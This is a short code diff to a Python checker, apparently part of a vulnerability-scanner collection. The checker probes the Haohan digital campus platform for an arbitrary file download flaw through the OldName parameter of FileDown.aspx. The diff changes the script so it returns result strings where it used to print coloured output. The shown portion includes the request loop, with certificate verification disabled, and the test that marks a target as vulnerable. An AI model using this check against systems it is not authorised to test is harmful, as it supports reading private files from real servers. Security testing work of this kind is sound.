@@ -8,8 +8,8 @@ description: 文件FileDown.aspx中,参数OldName存在任意文件下载。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class haohan_FileDown_filedownload_BaseVerify:
     def __init__(self, url):
@@ -27,12 +27,12 @@ class haohan_FileDown_filedownload_BaseVerify:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.headers["Content-Type"] == "application/xml":
-                    cprint("[+]存在皓翰数字化校园平台任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    return "[+]存在皓翰数字化校园平台任意文件下载漏洞...(高危)\tpayload: "+vulnurl
 
             except:
-                cprint("[-] "+__file__+"====>连接超时", "cyan")
+                return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = haohan_FileDown_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
